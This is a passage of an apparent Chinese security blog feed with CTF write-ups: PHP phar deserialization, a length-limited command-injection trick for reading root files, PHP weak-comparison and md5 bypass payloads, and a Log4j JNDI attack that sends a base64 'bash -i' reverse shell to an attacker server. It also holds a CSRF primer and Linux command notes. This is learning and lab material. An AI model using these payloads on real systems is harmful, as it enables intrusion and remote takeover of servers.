class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (â²â½`ã)&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 每一次上传文件结束后触发</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line"><span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="comment">#file_get_contents和echo都会触发tostring方法，所以实质上$uploader就等价于$filename</span></span><br><span class="line"><span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第一次上传文件，没有回显，因为这时候name没有赋值，所以filename&#x3D;$sandbox.$_SESSION[‘user’].$ext，而且因为第一次还没触发destruct方法，所以上传的文件实质上是在tmp目录，因此<code>echo file_get_contents($uploader)</code>为空</p><p>第二次文件上传时，第一次结束触发destruct方法，就会把上一次上传的文件移到$filename路径，所以就会输出上一次上传的文件的内容。</p></blockquote><p>第一次随便上传文件，获取<code>$_SESSION[&#39;user&#39;]</code>，用于绕过</p><p>第二次上传phar文件</p><p>第三次用name参数用phar协议访问phar文件，通过<code>file_get_contents($uploader)</code>触发反序列化完成攻击</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="UUCTF-2022-新生赛-ezrce"><a href="#UUCTF-2022-新生赛-ezrce" class="headerlink" title="[UUCTF 2022 新生赛]ezrce"></a>[UUCTF 2022 新生赛]ezrce</h2><p>给出了一个命令执行接口，测试之后发现长度限制为6,正常思路</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">a</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112107946-1687675268129.png" alt="image-20221107112107946"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112233686-1687675268129.png" alt="image-20221107112233686"></p><p>然后尝试访问&#x2F;tmp&#x2F;a，服务器没有报错，说明<code>&gt;a</code>其实是执行成功了的。</p><ul><li><p>解法1</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cp</span></span></span><br><span class="line">* /* .</span><br></pre></td></tr></table></figure><p>第一条命令创建一个文件名为cp的文件</p><p>第二条命令执行<code>cp /* .</code>，将根目录下的文件复制到当前目录下，然后访问&#x2F;tmp&#x2F;flag即可</p><p><img src="/../images/image-20221107113239425-1687675268129.png" alt="image-20221107113239425"></p></li><li><p>解法2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">nl</span></span></span><br><span class="line">* /*&gt;a</span><br></pre></td></tr></table></figure><p>第一条命令创建一个文件名为nl的文件</p><p>第二条命令执行<code>nl /*&gt;a</code>，读取根目录下所有文件的内容重定向到a中，然后访问&#x2F;tmp&#x2F;a即可</p><p><img src="/../images/image-20221107113608245-1687675268129.png" alt="image-20221107113608245"></p></li><li><p>解法3</p><p>直接写🐎</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2023/05/31/CSRF/"/>
      <url>/2023/05/31/CSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>攻击者伪造用户的请求，诱导用户点击恶意链接，利用用户的cookie让服务器以为是用户操作，从而发起攻击。</p><p><img src="/../images/image-20230321141146612.png" alt="image-20230321141146612"></p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>web应用程序在用户进行敏感操作时，没有进行身份验证，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>伪造用户请求，用户能做啥，这个漏洞就能做啥</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><ul><li>数据包无token和referer验证</li></ul><p>无token验证并且无referer验证时，就基本存在跨站请求伪造，但基于功能点不同，一些为无意义无危害的跨站请求伪造。</p><p>提交数据包时抓包删除referer字段，如果不报错，则基本存在跨域请求伪造，GET型构造链接，POST型写一个提交表单，测试有跨域情况下提交的数据包是否生效。</p><ul><li>数据包无token有referer验证</li></ul><p>只有referer验证时，可尝试空referer，或者尝试域名伪造。</p><ul><li>burp自带的csrf检测功能</li></ul><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><blockquote><p>关键点在于</p><p>攻击者可以预先伪造用户的请求，所以只需要使得请求参数难以伪造。</p></blockquote><ul><li><p>当用户发送重要的请求时需要输入原始密码，手机验证码等</p></li><li><p>设置Token</p></li><li><p>检验 referer 来源</p><p>疑问：referer不是可以进行伪造吗？</p><p>答：攻击者确实可以在发送请求时进行伪造，但是csrf是用户发起请求，用户不会去伪造；</p><p>不过当网站本身可以植入csrf的payload时，检验refer来源的防御手段就失效了。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF 2022</title>
      <link href="/2023/05/31/HNCTF/"/>
      <url>/2023/05/31/HNCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="HNCTF-2022-WEEK3-Fun-php"><a href="#HNCTF-2022-WEEK3-Fun-php" class="headerlink" title="[HNCTF 2022 WEEK3]Fun_php"></a>[HNCTF 2022 WEEK3]Fun_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$getUserID</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]; </span><br><span class="line"><span class="variable">$getpass</span> = (<span class="keyword">int</span>)@<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]; </span><br><span class="line"><span class="variable">$getmySaid</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;mySaid&#x27;</span>]; </span><br><span class="line"><span class="variable">$getmyHeart</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;myHeart&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$verify</span> =@<span class="variable">$_POST</span>[<span class="string">&#x27;verify&#x27;</span>];</span><br><span class="line"><span class="variable">$want</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;want&#x27;</span>];</span><br><span class="line"><span class="variable">$final</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;final&#x27;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$getUserID</span>))</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$user</span> + <span class="variable">$getUserID</span>; <span class="comment">//u5er_D0_n0t_b3g1n_with_4_numb3r</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span> == <span class="number">114514</span> &amp;&amp; <span class="variable">$getpass</span> == <span class="variable">$pass</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$getmySaid</span>)) </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$getmyHeart</span>)) </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$getmySaid</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$getmyHeart</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Cheater!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$week_1</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>字符串与数字弱比较</p><blockquote><p>u5er_D0_n0t_b3g1n_with_4_numb3r</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;sdasd114514&#x27;</span> ==  <span class="number">114514</span></span><br><span class="line">    </span><br><span class="line">get --&gt; user=<span class="number">114514</span></span><br></pre></td></tr></table></figure></li><li><p>猜测$pass为字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;dbasdha&#x27;</span> == <span class="number">0</span> <span class="comment">//True</span></span><br><span class="line"></span><br><span class="line">get --&gt; pass=<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p>字符串与数字MD5相等</p><p>科学计数法绕过  <strong>0e开头的数字字符串</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s214587387a</span><br><span class="line">   </span><br><span class="line"><span class="number">1586264293</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]===<span class="string">&quot;Probius&quot;</span>) <span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$i</span>]=<span class="title function_ invoke__">intval</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;Probius&quot;</span>,<span class="variable">$data</span>)===<span class="number">0</span>)</span><br><span class="line">        <span class="variable">$week_2</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>array_search默认弱比较查找,返回查找成功元素的下标</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; data[]=<span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$week_1</span> &amp;&amp; <span class="variable">$week_2</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$data</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$verify</span>))</span><br><span class="line">        <span class="comment">// ‮⁦HNCTF⁩⁦Welcome to</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;hn&quot;</span> == <span class="variable">$_GET</span>[<span class="string">&#x27;hn&#x27;</span>] &amp;‮⁦+!!⁩⁦&amp; <span class="string">&quot;‮⁦ Flag!⁩⁦ctf&quot;</span> == <span class="variable">$_GET</span>[‮⁦LAG⁩⁦ctf]) &#123; <span class="comment">//HN! flag!! F</span></span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="variable">$want</span>)Or <span class="title function_ invoke__">is_file</span>(<span class="variable">$want</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">       </span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Fine!you win&quot;</span>;</span><br><span class="line">                    <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ./<span class="subst">$want</span>&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5弱比较，数组绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; data[]=<span class="number">0</span>&amp;verify[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221101183032110-1686150252660.png" alt="image-20221101183032110"></p><p>零宽度隐写，？？？？</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get --&gt; </span><br><span class="line">    </span><br><span class="line">hn=hn&amp;%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6LAG%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6ctf=%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6%<span class="number">20</span>Flag!%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6ctf</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="variable">$want</span>)Or <span class="title function_ invoke__">is_file</span>(<span class="variable">$want</span>))</span><br></pre></td></tr></table></figure><p>通配符绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; want=f*</span><br></pre></td></tr></table></figure><h3 id="HNCTF-2022-WEEK3-logjjjjlogjjjj"><a href="#HNCTF-2022-WEEK3-logjjjjlogjjjj" class="headerlink" title="[HNCTF 2022 WEEK3]logjjjjlogjjjj"></a>[HNCTF 2022 WEEK3]logjjjjlogjjjj</h3><p>复现：<a href="https://blog.csdn.net/weixin_47179815/article/details/125654828">https://blog.csdn.net/weixin_47179815/article/details/125654828</a></p><p>本地环境：JDK版本1.8</p><p>攻击流程</p><ul><li><p>服务器运行攻击脚本生成payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,base64(反弹shell)&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 服务器ip</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20221101211620970-1686150252661.png" alt="image-20221101211620970"></p><ul><li><p>服务器监听端口</p></li><li><p>发送payload</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:xxx:<span class="comment">//xxxx/xxx&#125;</span></span><br><span class="line">将上面生成的payload放入（优先JDK）</span><br></pre></td></tr></table></figure><p>URL编码后发送请求</p><p><img src="/../images/image-20221101211959222-1686150252662.png" alt="image-20221101211959222"></p></li></ul><p>成功连接</p><img src="E:\typora img\image-20221101211512855.png" alt="image-20221101211512855" style="zoom:50%;" /><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="简单编码"><a href="#简单编码" class="headerlink" title="简单编码"></a>简单编码</h3><p>图片尾部有一串url编码后的字符</p><p><img src="/../images/image-20221102000004428-1686150252663.png" alt="image-20221102000004428"></p><h3 id="HNCTF-2022-Week1-线下单杀出题人（OSINT"><a href="#HNCTF-2022-Week1-线下单杀出题人（OSINT" class="headerlink" title="[HNCTF 2022 Week1]线下单杀出题人（OSINT)"></a>[HNCTF 2022 Week1]线下单杀出题人（OSINT)</h3><p><img src="/../images/image-20221101232202282-1686150252663.png" alt="image-20221101232202282"></p><p>首先从A图片中提取出经纬度</p><p><img src="/../images/image-20221101232242899-1686150252663.png" alt="image-20221101232242899"></p><p>因为这个经纬度是度分秒的形式，需要先转换为度数形式</p><p>格式转换：<a href="http://www.gzhatu.com/du2dfm.html">http://www.gzhatu.com/du2dfm.html</a></p><p>定位：<a href="http://www.gzhatu.com/dingwei.html">http://www.gzhatu.com/dingwei.html</a></p><p><img src="/../images/image-20221101232434815-1686150252663.png" alt="image-20221101232434815"></p><p>A图片中还有一个提示</p><p><img src="/../images/image-20221101232718045-1686150252663.png" alt="image-20221101232718045"></p><p>所以可以确定定位是正确的。</p><p>然后根据第二张图中的河流可以知道是往哪条路走的。</p><img src="E:\typora img\image-20221101232747393.png" alt="image-20221101232747393" style="zoom:67%;" /><p>用高德地图定位嘉兴电信大厦，往那条路找，找到</p><img src="E:\typora img\image-20221101232627057.png" alt="image-20221101232627057" style="zoom:67%;" /><p>flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(md5(<span class="string">&#x27;嘉兴市南湖区禾兴北路506号亚芬汀精品酒店&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest())<span class="comment">#utf-8编码</span></span><br></pre></td></tr></table></figure><p>SSCTF{f833a4d17d35ca5da40f087950293d04}</p><p>也可以用exif工具查看</p><img src="E:\typora img\image-20221101234725942.png" alt="image-20221101234725942" style="zoom: 50%;" /><h3 id="HNCTF-2022-Week1-三生三世"><a href="#HNCTF-2022-Week1-三生三世" class="headerlink" title="[HNCTF 2022 Week1]三生三世"></a>[HNCTF 2022 Week1]三生三世</h3><p>弱密码爆破，图片base64隐写得到二维码，扫描后用栅栏密码解密，每组字数为3.</p><h3 id="HNCTF-2022-Week1-silly-zip"><a href="#HNCTF-2022-Week1-silly-zip" class="headerlink" title="[HNCTF 2022 Week1]silly_zip"></a>[HNCTF 2022 Week1]silly_zip</h3><p>伪加密+IHDR修改</p><h3 id="HNCTF-2022-Week1-piz-galf"><a href="#HNCTF-2022-Week1-piz-galf" class="headerlink" title="[HNCTF 2022 Week1]piz.galf"></a>[HNCTF 2022 Week1]piz.galf</h3><p>两次逆序</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\khaz\Downloads\pmb.galf&quot;</span> , <span class="string">&#x27;rb&#x27;</span> ).read()</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\khaz\Downloads\flag.bmp&quot;</span> , <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f2.write(f[ ::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令</title>
      <link href="/2023/05/31/Linux%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/05/31/Linux%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>Linux一切皆文件</p><p>没有信息就是好消息，说明命令成功了。</p><h2 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><h2 id="后台运行程序"><a href="#后台运行程序" class="headerlink" title="后台运行程序"></a>后台运行程序</h2><ul><li>后台运行</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd &amp;</span><br><span class="line">nohup cmd</span><br></pre></td></tr></table></figure><ul><li>查看后台程序</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jobs</span><br></pre></td></tr></table></figure><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><ul><li><p><code>vi /vim filename</code>：文本编辑器</p></li><li><p><code>touch filename</code>：创建空文件</p></li><li><p>重定向符创建</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;string&quot; &gt; filename</span><br><span class="line">cat &gt; filename：输入文件内容，ctrl+d保存并退出</span><br></pre></td></tr></table></figure></li></ul><h3 id="复制文件-x2F-目录"><a href="#复制文件-x2F-目录" class="headerlink" title="复制文件&#x2F;目录"></a>复制文件&#x2F;目录</h3><ul><li><p><code>cp file_path xx</code></p><p>当xx为文件时，即创建file的副本xx</p><p>当xx为目录时，即将file复制到xx目录下</p><p>可选参数：-R  复制文件夹</p></li></ul><h3 id="文件链接"><a href="#文件链接" class="headerlink" title="文件链接"></a>文件链接</h3><ul><li><p>软链接&#x2F;符号链接</p><p><code>ln -s 源文件名 快捷方式名</code>（软连接，只是创建了一个快捷方式）</p></li><li><p>硬链接</p><p><code>ln  源文件名 文件名</code>（硬链接，两个文件是同步的，就是对任意一个操作，都会影响到两个）  </p></li><li><p>二者区别</p><p>删除了源文件，软连接就失效了，而硬链接相当于副本，不受影响。</p></li></ul><h3 id="重命名文件-x2F-目录"><a href="#重命名文件-x2F-目录" class="headerlink" title="重命名文件&#x2F;目录"></a>重命名文件&#x2F;目录</h3><blockquote><p>在Linux中，重命名文件称为移动（moving）</p></blockquote><ul><li><code>mv name1  name2</code>：更改文件名&#x2F;目录名</li><li><code>mv name dir_path</code>：移动文件&#x2F;目录</li><li><code>mv file_path   dir_path+file_name2</code>：移动文件并重命名</li></ul><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><blockquote><p>在Linux中，删除（deleting）叫作移除（removing）。</p></blockquote><ul><li><code>rm  filename</code><ul><li>-i：删除前询问</li><li>-f：强制删除</li></ul></li></ul><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><table><thead><tr><th align="center">命令</th><th align="center">作用</th><th align="center">可选参数</th></tr></thead><tbody><tr><td align="center">cat&#x2F;tac</td><td align="center">从头到尾显示文件内容（tac相反）</td><td align="center">-n：显示行号</td></tr><tr><td align="center">head&#x2F;tail</td><td align="center">读取前&#x2F;后lines行</td><td align="center">–lines&#x3D;？</td></tr><tr><td align="center">nl</td><td align="center">显示行号和内容</td><td align="center"></td></tr><tr><td align="center">sort</td><td align="center">排序文件内容并显示</td><td align="center"></td></tr><tr><td align="center">more</td><td align="center">分页显示文件内容</td><td align="center"></td></tr><tr><td align="center">uniq</td><td align="center">去重后，显示文件内容</td><td align="center"></td></tr><tr><td align="center">less</td><td align="center">一次显示一屏的文件文本</td><td align="center"></td></tr><tr><td align="center">paste</td><td align="center">可以将两个文本按列拼接到一起显示</td><td align="center"></td></tr><tr><td align="center">strings</td><td align="center">读取二进制文件（cat不能读取二进制）</td><td align="center"></td></tr></tbody></table><h3 id="搜索文件内容"><a href="#搜索文件内容" class="headerlink" title="搜索文件内容"></a>搜索文件内容</h3><p><code>grep string filename</code> ：在file中查找匹配string的内容</p><p>参数：</p><table><thead><tr><th align="center"></th><th align="center">功能</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">-v</td><td align="center">反向搜索</td><td align="center">grep -v t file1</td></tr><tr><td align="center">-n</td><td align="center">显示行号</td><td align="center">grep -n t file1</td></tr><tr><td align="center">-e</td><td align="center">多个匹配模式</td><td align="center">grep -e t -e f file1：匹配t和f字符</td></tr><tr><td align="center">正则</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="查看文件类型-x2F-状态"><a href="#查看文件类型-x2F-状态" class="headerlink" title="查看文件类型&#x2F;状态"></a>查看文件类型&#x2F;状态</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file filename</span><br><span class="line">stat filename</span><br></pre></td></tr></table></figure><h3 id="解压缩文件"><a href="#解压缩文件" class="headerlink" title="解压缩文件"></a>解压缩文件</h3><p>赋予文件权限</p><p><code>chmod +rw filename</code></p><ul><li><p>tar</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">解包：tar xvf FileName.tar</span><br><span class="line">打包：tar cvf FileName.tar DirName</span><br><span class="line">（注：tar是打包，不是压缩！）</span><br></pre></td></tr></table></figure></li></ul><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><p>理解权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -l</span><br><span class="line">total 16</span><br><span class="line">-rwxrwxr-x 1 rich rich 4882 2010-09-18 13:58 myprog</span><br><span class="line">....</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230225224057939.png" alt="image-20230225224057939"></p><p>-rwxrwxr-x解读为-，rwx，rwx，r-x</p><ul><li><p>第一个字符</p><table><thead><tr><th align="center">字符</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">-</td><td align="center">代表文件</td></tr><tr><td align="center">d</td><td align="center">代表目录</td></tr><tr><td align="center">l</td><td align="center">代表链接</td></tr><tr><td align="center">c</td><td align="center">代表字符型设备</td></tr><tr><td align="center">b</td><td align="center">代表块设备</td></tr><tr><td align="center">n</td><td align="center">n代表网络设备</td></tr></tbody></table></li><li><p>后面9个字符，每三个为一组              </p><table><thead><tr><th align="center">字符</th><th align="center">含义</th><th align="center">每一组对应的安全级别</th></tr></thead><tbody><tr><td align="center">r</td><td align="center">代表对象是可读的</td><td align="center">文件属主的权限</td></tr><tr><td align="center">w</td><td align="center">代表对象是可写的</td><td align="center">属主成员的权限</td></tr><tr><td align="center">x</td><td align="center">代表对象是可执行的</td><td align="center">其他用户的权限</td></tr></tbody></table><blockquote><p>若没有某种权限，在该权限位会出现单破折线。</p><p>属主成员指的是与文件属主在同一个用户组的成员</p><p>其他用户指的是与文件属主不在同一个用户组的成员</p></blockquote></li></ul><img src="../images/image-20220927165623523.png" alt="image-20220927165623523" style="zoom:67%;" /><h4 id="改变权限"><a href="#改变权限" class="headerlink" title="改变权限"></a>改变权限</h4><p>chmod</p><img src="../images/image-20221030190551191.png" alt="image-20221030190551191" style="zoom: 67%;" /><p>八进制法</p><p><code>sudo  chmod 777  filename</code></p><blockquote><p>777由上图可知是赋予全部权限</p></blockquote><h4 id="设置默认权限"><a href="#设置默认权限" class="headerlink" title="设置默认权限"></a>设置默认权限</h4><p>umask</p><p><img src="/../images/image-20230318143219603.png" alt="image-20230318143219603"></p><p><img src="/../images/image-20230318143232817.png" alt="image-20230318143232817"></p><p>文件权限&#x3D;777-umask&#x3D;755</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="查看目录下的文件"><a href="#查看目录下的文件" class="headerlink" title="查看目录下的文件"></a>查看目录下的文件</h3><ul><li><code>ls</code></li></ul><table><thead><tr><th align="center">可选参数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-l</td><td align="center">查看详细信息</td></tr><tr><td align="center">-a</td><td align="center">显示所有文件（包括隐藏文件）</td></tr><tr><td align="center">-R</td><td align="center">展示当前目录下的所有子目录和文件</td></tr><tr><td align="center">-i</td><td align="center">展示文件的索引节点</td></tr><tr><td align="center">-F</td><td align="center">展示文件类型</td></tr></tbody></table><blockquote><p>-F</p><p>目录后加上<code>/</code></p><p>可执行文件后加上<code>*</code></p></blockquote><p><img src="/../images/image-20220819201845329.png" alt="image-20220819201845329"></p><ul><li><code>dir</code></li><li><code>vdir</code> 等价于 <code>ls -l</code></li></ul><h3 id="查看目录结构"><a href="#查看目录结构" class="headerlink" title="查看目录结构"></a>查看目录结构</h3><p><code>tree dir</code></p><p><img src="/../images/image-20220818190348296.png" alt="image-20220818190348296"></p><h3 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h3><ul><li><p><code>mkdir dir_name</code>：创建单个目录</p></li><li><p><code>mkdir 